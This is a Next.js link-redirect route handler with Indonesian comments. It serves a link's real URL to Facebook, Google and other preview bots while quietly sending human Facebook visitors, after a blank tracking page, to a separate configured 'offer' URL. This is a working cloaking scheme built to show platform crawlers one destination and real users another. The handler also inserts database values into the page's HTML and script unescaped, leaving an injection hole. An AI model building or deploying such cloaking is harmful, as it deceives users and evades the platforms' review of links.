import { NextResponse } from 'next/server';
import { supabase } from '@/data/supabase';

export async function GET(
  request: Request,
  { params }: { params: Promise<{ slug: string }> }
) {
  const { slug } = await params;

  // 1. AMBIL DATA DARI DATABASE (Parallel: Link & Settings)
  const [linkResult, settingsResult] = await Promise.all([
    supabase.from('links').select('url, clicks').eq('id', slug).single(),
    supabase.from('settings').select('*').eq('id', 1).single()
  ]);

  const entry = linkResult.data;
  const settings = settingsResult.data;

  // 2. Jika link tidak ada, lempar ke 404
  if (linkResult.error || !entry) {
    const url = new URL(request.url);
    return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
  }

  // --- LOGIKA HITUNG PENGUNJUNG ---
  const newCount = (entry.clicks || 0) + 1;
  supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();

  // --- LOGIKA UTAMA (COPY DARI KODE LAMA KAMU) ---
  
  // Default Tujuan = Link Asli
  let finalDestination = entry.url;

  const urlObj = new URL(request.url);
  const searchParams = urlObj.searchParams;
  const referer = request.headers.get('referer') || "";
  const userAgent = request.headers.get('user-agent') || "";

  // MAPPING DATA DARI DATABASE (PENGGANTI JSON)
  // Pastikan kolom di tabel settings kamu sesuai: offer_url, offer_active, histats_id, delay_ms, site_name
  const OFFER_URL = settings?.offer_url || "";
  const IS_OFFER_ACTIVE = settings?.offer_active || false;
  const HISTATS_ID = settings?.histats_id || "";
  const DELAY_MS = settings?.delay_ms || 2000;
  const SITE_NAME = settings?.site_name || "Loading...";

  // LOGIKA DETEKSI (PERSIS KODE LAMA)
  const hasFbclid = searchParams.has('fbclid');
  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
  
  // Regex Bot (Sesuai kode lama kamu)
  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);

  // LOGIKA BELOK KE OFFER
  // Syarat: Offer Aktif + (Ada fbclid ATAU dari FB) + BUKAN BOT
  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
    finalDestination = OFFER_URL;
  }

  // KASUS A: Jika BOT -> Redirect Langsung (Biar preview muncul)
  if (isBot) {
    return NextResponse.redirect(entry.url, { status: 307 });
  }

  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats + Redirect JS
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${SITE_NAME}</title>
      <style>
        body {
          background-color: #ffffff; /* Latar Putih Polos */
          margin: 0;
          height: 100vh;
          overflow: hidden;
        }
      </style>
    </head>
    <body>
      <script type="text/javascript">
        var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,${HISTATS_ID},4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
          var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
          hs.src = ('//s10.histats.com/js15_as.js');
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();
      </script>
      <noscript>
        <a href="/" target="_blank">
          <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
        </a>
      </noscript>

      <script>
        setTimeout(function() {
          window.location.href = "${finalDestination}";
        }, ${DELAY_MS});
      </script>
    </body>
    </html>
  `;

  return new NextResponse(htmlContent, {
    headers: { 'Content-Type': 'text/html' },
  });
}
